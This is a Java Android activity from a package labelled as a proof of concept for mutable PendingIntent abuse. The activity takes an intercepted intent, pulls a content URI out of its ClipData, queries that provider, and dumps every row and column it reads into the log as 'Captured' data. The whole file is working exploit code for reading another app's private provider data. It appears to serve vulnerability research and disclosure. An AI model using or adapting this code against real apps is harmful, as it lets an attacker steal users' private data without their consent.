package sherlock.poc.mutable_pending_intent;

import android.content.ClipData;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

public class InterceptNotifBaseActivity extends AppCompatActivity {

    private static final String TAG = "sherlock.poc.mutable_pending_intent.InterceptNotifBaseActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        ClipData clipData = getIntent().getClipData();
        if (clipData != null) {
            Uri uri = clipData.getItemAt(0).getUri();
            Cursor c = getContentResolver().query(
                    uri,
                    null,
                    null,
                    null,
                    null
            );
            try {
                if (c.getCount() == 0) {
                    return;
                }
                c.moveToFirst();
                StringBuilder sb = new StringBuilder();
                while (!c.isAfterLast()) {
                    for (int i = 0; i < c.getColumnCount(); i++) {
                        String providerData = c.getColumnName(i) + ":" + c.getString(i) + ";\n";
                        sb.append(providerData);
                    }
                    c.moveToNext();
                }
                Log.d(TAG, "Captured: " + sb);
            } finally {
                c.close();
            }
        }
    }
}
